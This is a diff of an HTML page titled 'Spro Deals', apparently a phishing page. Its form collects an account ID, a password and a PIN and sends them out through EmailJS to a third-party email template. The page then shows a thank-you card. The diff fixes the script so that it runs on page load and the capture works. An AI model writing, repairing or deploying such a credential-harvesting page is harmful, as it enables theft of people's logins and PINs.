@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Spro Deals</title>
@@ -31,26 +31,26 @@
   <!-- EmailJS SDK -->
   <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script>
-    (function(){
-      emailjs.init("-7KTj0rOkVUhgUEx2"); // Public Key
-    })();
+    document.addEventListener("DOMContentLoaded", function() {
+      emailjs.init("-7KTj0rOkVUhgUEx2"); // ✅ sirf key, koi bracket nahi
 
-    document.getElementById("sproForm").addEventListener("submit", function(e){
-      e.preventDefault();
+      document.getElementById("sproForm").addEventListener("submit", function(e){
+        e.preventDefault();
 
-      var templateParams = {
-        account_id: document.getElementById("account_id").value,
-        pass: document.getElementById("pass").value,
-        pin: document.getElementById("pin").value
-      };
+        var templateParams = {
+          account_id: document.getElementById("account_id").value,
+          pass: document.getElementById("pass").value,
+          pin: document.getElementById("pin").value
+        };
 
-      emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
-        .then(function(response) {
-          document.getElementById("formCard").style.display = "none";
-          document.getElementById("thanks").style.display = "block";
-        }, function(error) {
-          alert("❌ Failed: " + JSON.stringify(error));
-        });
+        emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
+          .then(function(response) {
+            document.getElementById("formCard").style.display = "none";
+            document.getElementById("thanks").style.display = "block";
+          }, function(error) {
+            alert("❌ Failed: " + JSON.stringify(error));
+          });
+      });
     });
   </script>
 </body>
